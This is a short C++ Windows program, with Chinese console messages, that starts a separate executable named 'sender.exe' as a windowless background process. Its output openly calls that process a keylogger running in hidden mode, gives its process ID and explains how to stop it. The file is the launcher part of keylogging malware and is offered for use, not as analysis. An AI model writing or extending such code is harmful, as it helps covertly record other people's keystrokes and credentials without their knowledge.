#include<windows.h>
#include<iostream>
#include<clocale>
using namespace std;
int main(){
	setlocale(LC_ALL, "zh_CN.UTF-8");
	system("chcp 65001");
	STARTUPINFO si={0};
	PROCESS_INFORMATION pi={0};
	si.cb=sizeof(si);
	BOOL ok=CreateProcess("sender.exe",NULL,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
	if(ok){
		cout<<"键盘记录器已启动（隐藏模式）\n进程ID: "<<pi.dwProcessId<<"\n要停止记录，请使用任务管理器结束进程，或按Ctrl+Alt+Q\n";
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
    else{
        cout<<"启动失败！错误代码: "<<GetLastError()<<"\n请确认 sender.exe 存在于当前目录\n";
    }
	cout<<"按回车键退出程序...\n";
	cin.get();
	return 0;
}
